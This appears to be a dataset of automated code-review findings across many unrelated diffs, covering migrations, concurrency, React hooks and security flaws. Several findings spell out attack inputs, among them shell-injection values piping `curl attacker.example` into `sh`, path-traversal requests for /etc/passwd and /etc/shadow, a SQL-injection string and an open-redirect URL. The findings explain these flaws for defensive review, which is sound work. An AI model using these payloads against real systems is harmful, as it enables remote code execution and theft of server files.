findings.title: Flipping the Default language from "ru" to "en" is incomplete if a test or fixture asserts the old default "ru".
`Date.current()` on lines 4 and 6 is not a JavaScript Date API, so this Clock component throws a TypeError instead of rendering the time.

The registered exec effect of Ping changes target from the fixed constant gateway to the request parameter host, and a new unresolved Query effect is introduced, so the effects are not kept as registered.
Keep the gateway constant as the default and only override it when the host parameter is non-empty, so the endpoint's target stays explicit.
For ob-1, the changed path no longer keeps the target of its registered exec effect: the command was 'ping -c 1 10.0.0.1' and is now 'sh -c "ping -c 1 <request host> | tail -n 1"'.
The shell string is built by concatenating an unvalidated query parameter, so a host value containing shell metacharacters (for example '; id;') runs arbitrary commands on the server.
The added '| tail -n 1' silently restricts the captured output to one line, so the error body on line 12 no longer contains the full ping output that the base path returned.

The new package-level helper is named `created`, which does not say it returns an AppendEvent event string; naming it e.g. `orderCreatedEvent(id string) string` would prevent a future caller from misreading it as an object/observer constructor.
The 'go s.publisher.Publish(context.Background(), ...)' spawns an unowned, uncancellable goroutine whose error is silently dropped.
The registered effect Store.AppendEvent(ctx, tx, ...) is removed and replaced by a different, detached effect, so the order-created event is no longer appended to the transaction.
Commit and event publishing are now two independent steps, whereas BASE appended the event inside the same transaction.
Download now serves reportsDir/<name> for any filepath.IsLocal name instead of reportsDir/<id>.pdf for a numeric id, changing both the target and the condition of the file-serving effect.

The request query value `name` is passed to filepath.Join with reportsDir without removing path separators or `..` segments, so a request such as `?name=../../etc/passwd` serves files outside /srv/reports; the removed numeric parse and 400 rejection previously prevented this.

The changed path no longer performs its registered query-effect on the `id` parameter and no longer emits the 400 error effect, changing the target, condition and multiplicity of the path's effects (EFFECT-01).

The BASE version confined the served file to a generated numeric name; the HEAD version could keep the same guarantee by serving filepath.Join(reportsDir, filepath.Base(name)) (or by rejecting names containing a separator), matching the previous containment.
ByAuthor builds its SQL by interpolating the caller-supplied author into the query string with fmt.Sprintf before db.Query, so the executed statement and its WHERE condition are caller-controlled.
The new ByAuthor can use a parameterized db.Query with the author bound as an argument instead of fmt.Sprintf, and fmt can then be dropped from the imports.
Preview now fetches an arbitrary URL supplied by the requester with no scheme or host validation, so the handler can be pointed at internal or cloud-metadata endpoints.
Using http.Get with the default client gives the outbound request no timeout, so a slow or hung URL ties up the handler indefinitely.
The fetched URL's Content-Type and body are served back from the application's origin, so an attacker-controlled URL returning text/html yields script execution in the site's security context.
The result of io.Copy is dropped, so a mid-stream copy failure is silently reported as success; assign it or log it.
The ledger insert was moved from the request's transaction (tx.ExecContext) to a helper that writes on s.db, so the two writes are no longer atomic.
The Deployment's selector (app=web, line 6) no longer matches the pod template labels (app=website, line 8), so the rollout cannot succeed.

The backfill is a single unbounded `UPDATE orders SET state = status WHERE state IS NULL`, not the declared batched job, so on a large orders table it holds one long transaction while the app is already live.

Rows inserted by a version that writes neither status nor state (or writes state but leaves status NULL) are silently left un-backfilled, because the only source of the new value is the old status column.
The single statement has no comment stating its precondition (status must still exist and the app rollout must be complete) or its completion gate.

The unconditional UPDATE state = status can overwrite a fresher state written by a newer app version that no longer maintains status, losing the newer value in the PartialBackfillConcurrentWrites state.
If old writers keep writing only status while new readers read state, rows written by old app versions during the mixed window serve stale data until this backfill statement is re-run.
The backfill is a single unbounded UPDATE in migrations/ with no batching or completion gate, which does not match the declared 'batched job after the app rollout' execution model.
The migration drops orders.status in a single unconditional statement, with no evidence that reads/writes of status have stopped or that a prior release stopped using it.
Dropping the orders.status column destroys its data with no recovery or archive path shown in the migration.
Nothing in the migration records why dropping status is safe, so a future reader cannot verify the precondition was checked.
0002_drop_status.sql removes the status contract in a single step, with no visible gate showing that old app versions and supported client orders-web >= 2026.10 have stopped using the column.
Dropping a column while the declared initial schema_phase is 'expanded' and the rollout is mixed leaves old readers and writers without a column they may still use.
The migration destroys the existing values of orders.status with no visible backfill or archive, so the pre-drop data state has no shown recovery path.

The schema now stores 'partially_refunded' while the base parser rejects it (ref-2 line 7 has no such case), so in the mixed-version state an old instance reading such a row returns an error; UNKNOWN whether any write path emits 'partially_refunded' during the rollout.
ALTER TABLE orders ADD CONSTRAINT orders_status is not idempotent, so a restarted or replayed run of this migration fails with a duplicate-constraint error rather than resuming.

Split the constraint into ADD CONSTRAINT ... NOT VALID followed by VALIDATE CONSTRAINT orders_status to avoid holding an ACCESS EXCLUSIVE lock while the whole orders table is validated during the rollout.
After a rollback to the old image, orders rows written with 'partially_refunded' are no longer parseable by the old code.
The new value is accepted by the app code but only by the schema once migration 0002 is applied, so a rollout that ships the new app before the constraint write fails.
ADD CONSTRAINT orders_status CHECK ... without NOT VALID takes an ACCESS EXCLUSIVE lock and validates every existing orders row in one statement.

isPrintable accepts non-empty names made only of Unicode letters/digits/underscores, including names that start with a digit or contain non-ASCII letters, so formatLabel now emits those names unquoted though BASE always quoted them.

The helper name isPrintable is misleading because it checks identifier-like characters rather than printability; rename it to isBareName or isSimpleLabelName so future readers do not reuse it for a different predicate.
In the new Range function the local variable `stats` at line 14 shadows the imported package `stats` used elsewhere in the file.
Median sorts the caller's slice in place while its comment only promises 'returns the middle value', so the mutation is undocumented.
The failure message prints tc.in after Median has sorted it in place, so an error shows the reordered slice instead of the case as written.
SetMaxRetries writes the shared package variable maxRetries with no synchronization, so if maxRetries is read on a request path in another goroutine, the write races with those reads.
Replacing OnceLock::set with an unconditional store changes install from first-wins to last-wins, so a caller that relied on the first installed Config being kept now observes the last one.

The safety comment on the unsafe block only states the pointer invariant; naming the two places that must uphold it (`install`'s `&'static Config` parameter and the zero initializer) would keep a future change to install from silently invalidating it.

Clamping the exponent to 10 shortens the delay for attempts 11..31, which previously did not overflow (only attempt >= 32 does); e.g. with BASE = 10ms, attempt 14 changes from ~16.4s to ~10.2s instead of the previous 20.48s at attempt 11.

The literal 10 in `attempt.min(10)` is unexplained: it is neither the u32::pow overflow threshold (31) nor derived from MAX_DELAY, so a future change to MAX_DELAY or BASE may silently keep this wrong bound.
The signature of `listen` changed from `listen(addr: &str)` to `listen(addr: &str, backlog: u32)`, which breaks every existing caller unless they were all updated in this change.
The new test only covers the saturation path of `clamp_backlog`, so a regression that ignores normal values would still pass.
The new `timeout` method is the only builder method shown without `#[must_use]`, unlike `new` and `header` which both carry it.

The loop re-reads doc.settings().line_width() into `line_width` even though line 2 already holds the same value in `width`, so title and block wrapping can diverge if the width expression is ever changed in one place.

HEAD adds a second line_width lookup inside the loop instead of reusing the `width` computed at line 2; passing `width` directly to `wrap` removes the duplicate and keeps one width value for the whole document.
The global console.error is overwritten with a bare jest.fn() and never restored, which can make later tests in the same run silently swallow error output.
total is derived state kept in useState plus useEffect, so first paint shows formatPrice(0) and an extra render runs on every items change.

shippingCost returns a bare number without a unit suffix while its own parameter and the neighbouring freeShipping use unit-suffixed names (weightKg, cents), so callers can plausibly treat 500 as dollars.

shippingCost(0), shippingCost(-2) and shippingCost(NaN) all silently return 500 (a valid-looking price) instead of signalling an invalid weight; UNKNOWN whether callers validate weightKg before calling.

formatDiagnostic's output format changed from `file@offset: message` to `file:line:column: message` while its signature stayed the same, so existing callers that parse or assert on the old string see a different result without a compile error.
canDeleteTeam returns true for any non-null user whose role is not exactly 'member', so any role such as 'viewer' or 'guest' can delete a team, unlike canEditTeam which requires 'admin'.

canDeleteTeam widens the parameter to `User | null | undefined` while the neighbouring canEditTeam uses `User | null`, an inconsistency that invites callers to pass undefined without a typed contract.
The new doc comment on line 1 spells 'service' as 'servcie', a typo in text introduced by this change.
label no longer includes the legacy_status value, changing the returned string format from 'id: STATUS' to 'id' for every call site.

Removing legacy_status from the parameter type means callers whose objects are typed with legacy_status still pass structurally, but any downstream use of the removed field is no longer available through this function.
The `order` object parameter is now unnecessary indirection and its name suggests the full order shape is used when only `id` is read; the signature could take `id: string` directly.
0002_drop_legacy_status.sql removes legacy_status while web bundles from the last 14 days still read it, so old frontends break inside the declared compatibility window.
The column is dropped in the Schema step while old api replicas that still write legacy_status are still serving, so mixed-version writes target a non-existent column.
The status data is discarded rather than moved to a new form, so roll-forward recovery cannot restore it if the drop must be undone.
0002_drop_legacy_status.sql is written as an unconditional DROP COLUMN, so a retried or partially-applied migration fails instead of being a no-op.

The dispatcher now resolves the handler with getattr on a name built from event.kind, so an event whose kind has no matching on_<kind> attribute raises AttributeError instead of being routed, whereas the base version always called handlers.on_created.

The dynamic lookup has no guard for a missing attribute, so the natural follow-up is to resolve it defensively and raise a clear error (or keep the previous fallback) rather than let a bare AttributeError escape.

Encoding the 'on_' handler-name prefix as a string concatenation at the call site couples the dispatch convention to this line; an explicit mapping from event.kind to handler keeps the names in one place.

Adding sort_keys=True silently changes the serialized key order of every exported row, so callers that compare exact JSON text (snapshot tests, diffs, hash-based checks) would observe different output than before.
The introduction of sort_keys=True has no comment or docstring stating the intent (deterministic output), so a future reader may treat it as cosmetic and remove it.
Replacing `with open(path, "w") as f:` with a bare `f = open(path, "w")` leaves the file handle unclosed on every exit, including exception exit.

Trimming inside onChange makes the controlled input reject any typed whitespace and can move the caret to the end when the user edits in the middle of the field, because the value React writes back no longer matches what was typed.
If the intent is to accept 'CODE ' as 'CODE', the trim belongs in the submit handler or on blur rather than in the per-keystroke onChange, keeping the field's value equal to what the user typed.
The promo code input on line 11 is now a controlled input with value={code} and no onChange, so typing is ignored and the form always submits the initial code.
Removing the onChange removed the only writer of the code state within the shown span, so the state variable remains at its initial value for the lifetime of the component.
The resize listener registered in useEffect is no longer removed, because the previously returned cleanup at ref-1 line 8 was deleted.
The value passed to onApply is upper-cased but not trimmed, so a code pasted with stray whitespace is still applied verbatim and may not match.

Deleting event.preventDefault() from submit makes the browser perform the default form submission whenever submit is used as a form's onSubmit handler, reloading the page instead of applying the promo code in place.
The cache invalidation effect on successful rename (onSuccess -> client.invalidateQueries({ queryKey: ['orders'] })) is dropped in the extracted useRenameOrder hook.
Replacing onSuccess with onSettled makes the ['orders'] query invalidate and refetch after a failed rename, not only after a successful one.
Removing the onSuccess invalidateQueries call means the ['orders'] cache is no longer refreshed after a successful rename, so the UI keeps showing the old order name.

Line 7 references `ignoreAbort` as the rejection handler, but no import or declaration for it appears in the shown spans (the only import statement is from 'react'), so unless it is declared on an unseen line the binding is undefined.

The stale-response guard was replaced by AbortController alone, so correctness now depends on `fetchOrder(id, { signal })` actually honouring the signal; if the helper ignores the second argument, a response for a previous id can still call `setOrder`.

All rejections now funnel through the single `ignoreAbort` handler, so a genuine fetch failure for the current id may be swallowed and the component keeps rendering `<Spinner />` forever instead of surfacing an error state.
Removing the ignore guard and the cleanup makes every resolved fetchOrder(id) write state, so a stale response can overwrite a newer order and setOrder can run after the component unmounts.
The block-bodied useEffect discards the return value of cartStore.subscribe, so the subscription registered on mount is never unsubscribed.
Line 9 hardcodes the 'ru-RU' locale directly in the render, so this clock cannot follow an application-level locale and is a second place to change when the app language changes.
UNKNOWN: the change alters the rendered string for every user, so any existing test or snapshot that asserts the clock's output without a locale will now fail or need updating.
The `clearInterval` cleanup returned by the effect was removed, so the 1s interval created at HEAD:6 is never cleared on unmount.
Under React StrictMode double-invocation, the missing cleanup lets two intervals accumulate.
The extracted useWindowWidth effect registers a window 'resize' listener but returns no cleanup, whereas the base Banner effect returned a removeEventListener cleanup at ref-1 line 8.
The markdown parse and sanitize run on every render of Comment rather than only when `body` changes, so a list of comments re-parses unchanged bodies on each parent re-render.

UNKNOWN: `DOMPurify.sanitize` is called during render without any environment guard, so if Comment is rendered or imported during server-side rendering the call may throw; the file shows no 'use client' directive.
Rendering the caller-supplied body string as markdown HTML with dangerouslySetInnerHTML and no sanitizer turns any user-controlled body into injected HTML/script.
Parsing markdown inline on every render repeats work for an input that does not change between renders.
The class "markdown" on line 10 has no style defined in the changed code, so it may silently render unstyled.

The POST/PATCH response path at ref-16 line 111 still passes conn.assigns.locale to FoodJSON.food, so a browser accept-language list can rename a product in the write response although the moduledoc says names follow the food locale.
HEAD replaces the retry `publish || publish` with `publish || true;`, so relay() now returns success even when every publish attempt fails.
HEAD drops the second `publish` attempt that BASE used as a one-shot retry, so transient publish failures that previously recovered now fail.

If the stop sender is dropped or the stop channel closes, `stop.recv()` resolves immediately with `None`, so `pump` returns `Ok(())` and drops `frames`, discarding any frames still queued, whereas the base's `stop.try_recv().is_ok()` treated a disconnected channel as "continue".

The `tokio::select!` has no `biased;` and lists the frame branch first, so a pending stop is only chosen randomly and can be delayed when frames are continuously ready; writing `biased;` with the stop branch first would make shutdown deterministic.
The two select! branches read_frame(&mut socket) and ping(&mut socket) take two live mutable borrows of socket at once, so src/lib.rs is unlikely to compile as written.
Dropping the in-flight read_frame future when the idle or stop branch wins can discard a partially read frame if read_frame is not cancellation-safe.
UNKNOWN: the switch from try_recv().is_ok() to recv() in select! silently extends shutdown to sender-drop and to the period where the pump is blocked in read_frame; confirm this is intended.
Line 5 calls `backoff(attempt)`, but no definition or import of `backoff` is visible in either side of the diff, so it is UNKNOWN whether the head compiles.

The head replaced the explicit `continue` with a tail expression, so control now leaves the match instead of the iteration; a later edit adding a statement after the match would run on the retry path.

The retry backoff was changed from `continue` (yielding the loop) to `std::thread::sleep(backoff(attempt))` inside an `await`-using loop, which blocks the async executor thread for the whole backoff interval.
The blocking sleep is not interrupted by dropping the future, so a caller that cancels the request during backoff keeps the executor thread blocked until the full delay elapses.

Gating the `pub fn record` item behind `#[cfg(feature = "metrics")]` removes it from the crate (and public API) in default builds, and only the one call site shown was gated with the same attribute; any other caller, in-crate or downstream, would stop compiling when the feature is off.

Gating the whole public `record` function with `#[cfg(feature = "metrics")]` removes the item entirely when the feature is off; if any caller of `record` is not itself gated on the same feature, that build stops compiling — UNKNOWN, since callers are not shown.

If the intent is only to disable the counter increment, gate the body (`COUNTERS.increment(name)`) or the `COUNTERS` definition behind `#[cfg(feature = "metrics")]` instead of the whole `record` signature, so the public API stays available in default builds — UNKNOWN whether `COUNTERS` compiles without the feature.

On Windows, config_dir() now resolves under FOLDERID_LocalAppData instead of FOLDERID_RoamingAppData, so any settings or state previously written under the roaming 'orders' directory will not be found and the new directory starts empty.
Adding a second non-optional field `branch` to the serde-Deserialize struct makes every existing request that only sends repo_url fail to deserialize.

An empty or blank `branch` value is forwarded verbatim as `--branch <value>`, so the failure mode is an opaque git error; validating non-empty or giving a serde default with a concrete value prevents that.

Building a shell string from req.branch and req.repo_url and running it through `sh -c` allows arbitrary command execution by any client that controls those fields (e.g. repo_url = `x; curl attacker | sh`).

Dropping the `--` end-of-options separator and the per-argument quoting turns a hostile repo_url or branch beginning with `-` into a git option (argument injection), independent of shell metacharacters.
Using dir.display() to splice the destination path into the shell string silently corrupts non-UTF-8 paths that the previous argv-based call handled correctly.
If existing callers or stored requests do not send `branch`, PreviewRequest deserialization now fails; a serde(default) or Option<String> would preserve them.

The new guard makes any input that parses to 0 (e.g. "0", "0000", "+0" after trim) fail with ParseError::Zero, so a caller that previously received Ok(Cents(0)) now gets an error; whether that is correct depends on whether zero is a legal amount in this domain, which the shown spans do not state.
parse_amount now panics on non-numeric input instead of returning ParseError::NotANumber, changing a recoverable error path into a crash.
The function-level #[allow(clippy::unwrap_used)] also covers future unwraps added to parse_amount, not just the one on line 3.
The counter is now incremented before the remote fetch instead of after it, so `hits` counts started calls (including ones cancelled during the await) rather than completed lookups.

The new inner block around the lock (ref-2 L9-L12) suggests a lock-across-await hazard that does not exist in the BASE ordering, which may lead a future reader to copy the block as a mandatory pattern.
In HEAD the std::sync::MutexGuard for `hits` is held across the `self.remote.get(key).await`, which can block the runtime and changes cancellation semantics.
Representing `hits` as a std::sync::atomic::AtomicU64 instead of a Mutex-guarded counter makes the lock-across-await problem impossible and restores the BASE increment-after-await ordering.
The new log field attempt_id is written to the debug log, and if attempt_id is derived from or contains prompt text it would breach PRIV-01.
The head logs the entire request via `tracing::debug!(request = ?request, "dispatch")`, so the prompt text (and the provider API key if it is a Request field) reaches the debug log.
The HEAD change adds the provider API key and the full request body to a tracing::debug! log line, so both the credential and prompt text can reach log sinks.
Replace the interpolated secret/prompt with non-sensitive diagnostics such as body length or a hash/redacted marker, matching the BASE line that logged only model and bytes.
The new delegation for Failure::QuotaExhausted may return a chain route whose billing is paid, breaking the ROUTE-01 guarantee that quota exhaustion never reaches a paid route.
A short comment on this arm stating that on_quota_exhausted must stay subscription-only would keep the invariant visible next to the change.
On Failure::QuotaExhausted the route selection now falls back to the first healthy chain entry with no billing filter, so a route billed as paid API usage can be selected.
Keep the QuotaExhausted arm consistent with the neighbouring arm by expressing the intended filter explicitly, e.g. returning None as before or restricting to Billing::Subscription.
Previously the on-disk file was always "{user_id}.png", now the request value is used as the full filename, so a client sending the old numeric id "123" looks for the file "123" instead of "123.png".

The traversal guard only constrains the path to the avatar directory but no longer constrains the character set or extension, so any readable file inside AVATAR_DIR (not just PNG images) can be served.

UNKNOWN whether callers restrict the path segment, but as written the handler joins an unvalidated request string, so a name containing '..' segments escapes AVATAR_DIR (path traversal); e.g. avatar(Path("../../etc/passwd".into())).
An absolute name makes join discard AVATAR_DIR: avatar(Path("/etc/shadow".into())) reads /etc/shadow, since Path::join returns the absolute argument unchanged.

The change removed the only guard that kept the filename inside AVATAR_DIR: the base version formatted a u64 into "{user_id}.png", while the head version concatenates the raw segment and also drops the .png suffix.
The lock guard is acquired and immediately discarded, so the push at line 10 is no longer protected by the mutex as in BASE.
The sort_by_key(|e| e.at) call present in BASE at line 11 is gone from HEAD, so append no longer maintains entries ordered by timestamp unless unsynchronized() does it.
In HEAD a failed order-created publication no longer fails Store::save, violating EFFECT-01: the error is consumed by log_err! instead of being propagated with `?`.
`Store::save` discards the result of `bus.publish`, so a failed publication no longer fails the save and the error is silently swallowed.
Binding the publish result to `let _ =` hides the intent to ignore a failure; the BASE code used `?` and the rest of the file uses `?` for fallible calls.
`#[serde(default)]` on `coupon` has no effect while `OrderView` derives only `Serialize`; condition: the HEAD derive list at line 3 still contains only `Serialize`.
The `skip_serializing_if` value is spelled in the canonical fully qualified form used everywhere else; no defect, recorded only as consistency check.

Adding #[serde(rename_all = "camelCase")] (HEAD line 4) silently changes every serialized key of OrderView from snake_case to camelCase, e.g. order_id becomes orderId and total_cents becomes totalCents.
The camelCase rename is applied to OrderView alone, so if neighbouring view structs still serialize snake_case the repository now has two conflicting JSON naming conventions in the same module tree.

search() interpolates the bound term directly into a LIKE pattern, so a term containing '%' or '_' behaves as a wildcard instead of a literal: calling search(pool, "a%b") returns emails containing 'a' followed later by 'b', not emails containing the literal text 'a%b'.
search() has no LIMIT and uses fetch_all, so a broad term such as an empty or single-letter string returns and buffers the entire matching users result set.

The query literal is inline in search(), unlike the surrounding style; hoisting it to a `const SEARCH_USERS_SQL: &str` next to the existing query keeps the SQL visible when the table or column list changes.

search builds its SQL by embedding the unescaped term into the query string, which is a SQL injection; term should be passed as a bind parameter (e.g. sqlx::query_as(...).bind(term) or .bind(format!("%{term}%"))) so it is treated as data.

Even after moving to a bound parameter, the raw term is used as a LIKE pattern without escaping LIKE metacharacters (% and _), so a search for a literal percent or underscore over-matches; the pattern should escape those characters.
Because flush now runs in a spawned task rather than being awaited inline, cancelling/dropping the shutdown future no longer cancels flush; the spawned task detaches and keeps running.
Using tokio::spawn makes shutdown require a Tokio runtime and a Send + 'static future/buffer, where the base version only needed an executor to poll flush.
The spawn is awaited immediately, so it adds no concurrency and only extra task overhead plus the new runtime/Send requirements.
`flushing` names a JoinHandle, not the flush operation, which can mislead later edits about what is being awaited.
HEAD drops flush's error by spawning a detached task and returning Ok(()), whereas BASE propagated it with `?`.
The spawned flush task is detached: its JoinHandle is dropped and shutdown no longer owns, awaits or cancels that work.
Discarding the publish result with `let _ =` makes a failed order-created publication silently succeed, so a stored order is not rejected when publication fails.
Adding `#[ignore]` to `failed_publication_fails_the_save` silently removes the only shown check that save fails when publication fails, and no equivalent check replaces it.
The ignored test keeps the name `failed_publication_fails_the_save`, which names a contract the current production code no longer honours, so a future reader may trust a guard that never runs.

The default `exists` is implemented through `find`, so implementations that can answer existence without materializing an `Order` (e.g. a `SELECT EXISTS` in the `Postgres` impl) should override it; whether `Postgres` does so is not shown.

HEAD makes store errors indistinguishable from a missing order: Postgres::find now returns self.query_one(id).ok().flatten(), so any StoreError becomes None, and api::show turns that None into Page::not_found().
show() still declares Result<Page, StoreError> although no expression in it can now produce an Err, leaving callers with an error branch that can never run.

to_bytes(body, MAX_IMPORT_BYTES) may not raise the effective limit, because axum's DefaultBodyLimit wraps the request body stream itself (the comment on line 4 asserts a 2 MiB default), so the handler can still reject large exports.
Changing the parameter from Bytes (ref-1 line 4) to Body (ref-2 line 7) is a breaking signature change for every caller that passes Bytes, and no caller update is shown in these spans.
Every to_bytes failure is mapped to PAYLOAD_TOO_LARGE, so a mid-upload connection reset (a non-limit body error) is reported to the client as 413 rather than a body-read failure.
to_bytes(body, usize::MAX) buffers the entire request body in memory with no size limit, so a single large or slow client upload can exhaust the server's memory during import_csv.
Any failure from to_bytes is mapped to StatusCode::BAD_REQUEST, so a failed body read is reported as a client mistake rather than a server error or 413 Payload Too Large.
In the Reply arm the hoisted reserved value is never used, so the reservation lookup now runs needlessly on the common settled-cost path.
policy.timeout_charge may map a timeout's reserved charge to a known zero (or a non-Unknown value), which would violate BILL-01 by not preserving the reserved charge.
Settling a Timeout as Charge::Known(MicroUsd(0)) discards the reserved charge and settles a dispatched request with unknown outcome as zero, violating BILL-01.
Raising engine_version from 15 to 16 is a major RDS upgrade, but the resource does not set allow_major_version_upgrade = true, so the apply will be rejected.
The upgrade timing is left implicit: without apply_immediately the 15→16 upgrade lands in the next maintenance window, which is easy to miss on a data-holding instance.
The engine_version bump to 16 forces destruction and recreation of the stateful aws_db_instance.orders with no lifecycle protection or snapshot, causing downtime and data loss.

The exported formatPrice function is deleted, so any importer other than Checkout that still does `import { formatPrice } from '../lib/price'` would break; the shown spans only prove Checkout was updated.
Checkout now hardcodes the literal 'RUB' when calling formatTotal, so every checkout renders RUB even though the component receives only cents; UNKNOWN whether the app has any non-RUB currency path.
Inlining the formatting body is fine only if formatPrice had exactly one caller; the deleted name places the rounding/cents convention at one call site with no named place documenting it.
The head deletes the exported formatPrice function entirely, so any existing import of formatPrice from this module would no longer resolve.
The route awaits thumbnail without a try/catch, so any invalid size or ImageMagick failure produces an unhandled rejection and the client gets no response in Express 4.
The guard /^\d{1,4}x\d{1,4}$/ also accepts zero dimensions such as "0x0", which is not a valid ImageMagick geometry.
String(req.query.size ?? '200x200') does not fall back to the default when the client sends size as an empty string or a repeated (array) parameter, which then hits the size validation error path.
User-controlled req.query.size is interpolated into a shell command string executed by exec, so a value such as `200x200; curl attacker.example | sh` executes arbitrary commands on the server.

If thumbnail rejects (for example magick exits non-zero for a bad size or a missing source file), the async Express handler has no try/catch and, absent an error-handling middleware, the client never receives a response.
The size query parameter is forwarded verbatim to `magick -resize`, so a caller can request an arbitrarily large geometry and force expensive image processing.
The new handler key is computed from REFUND, but REFUND does not appear in the shown span; if it is not declared or imported in this module, the module throws a ReferenceError at load time.

The key is built by interpolating REFUND after the 'order.' prefix, which is only correct if REFUND is a bare suffix; if REFUND already contains the 'order.' prefix the handler is registered under a doubled prefix and refund events are never dispatched.
The refund handler is the only key assembled at runtime while its neighbours use full literal names, so the handler key and the emitted event name can drift apart without any type error.

The '/dashboard' fallback is now duplicated in concept between localPath's default and the previously hard-coded redirect target, without a shared constant.
The security intent of the two prefix rejections is undocumented, so the guard could be simplified away by a later edit.

The post-login redirect target is taken verbatim from the user-supplied query parameter `next`, so any absolute URL (e.g. `?next=https://evil.example`) is followed after a successful login, an open redirect (CWE-601).
`String(req.query.next)` accepts array-valued query parameters and silently stringifies them, so `?next=a&next=b` redirects to the nonsensical target `a,b` instead of falling back to /dashboard.

If UPLOAD_DIR is configured as a relative path, the prefix check on line 15 can never pass, because path.resolve() returns an absolute path while the comparison uses the un-resolved UPLOAD_DIR string.
The lexical startsWith check on the resolved path does not stop a symlink placed inside UPLOAD_DIR that points outside it, and res.download() follows such links.
String(req.query.name) coerces a missing or repeated query parameter into the literal name 'undefined' (or 'a,b'), so a request without name reaches res.download() instead of the 400 branch.

The new '/files/download' route joins the raw query parameter name onto UPLOAD_DIR with no confinement check, so a request such as /files/download?name=../../etc/passwd serves files outside the upload directory.

The handler does not validate that the resolved path is inside UPLOAD_DIR nor report a distinct status for a nonexistent target, so a bad or missing name surfaces as an opaque server error instead of a 400/404.

String(req.query.name) turns an absent or repeated name parameter into a literal filename ('undefined' or 'a,b') instead of being rejected, which is confusing to debug; a check for a single non-empty string before joining, or a 400 on a missing name, makes the failure obvious.
User input is embedded in the LIKE pattern unescaped, so '_' and '%' typed by a user act as wildcards instead of literal characters.
The new search parameter is interpolated directly into the SQL string, so a request such as /products?q=' OR true-- returns all rows and allows arbitrary SQL injection.
Unescaped LIKE metacharacters in q mean a search like '50%' matches every name starting with '50', so the filter silently behaves differently from the literal text the caller typed.
When the q parameter is absent the query becomes WHERE name ILIKE '%%', i.e. an unrequested full-table scan rather than an unfiltered or rejected request; UNKNOWN whether that is intended.

The import handler downloads the remote response fully into memory with neither a maximum size nor a timeout, so one request can consume unbounded memory and hold a connection until the origin closes it.
The fetched response's Content-Type is never checked, so non-image payloads (for example SVG or HTML) served by an allowlisted host are stored as avatars.
UNKNOWN whether req.body is guaranteed to be parsed here: if no body parser populated req.body, `req.body.url` throws a TypeError and turns a client error into a 500.
The 400 message 'unsupported image host' is also returned when the URL is unparsable, which misdescribes the failure.
The import route passes a caller-supplied URL straight to fetch(), so any client can make the server issue requests to arbitrary hosts, including internal-only addresses.
The response body is read fully into an arrayBuffer with no size cap or timeout, so a large or slowly-dripping remote response can consume memory or hold the request open indefinitely.
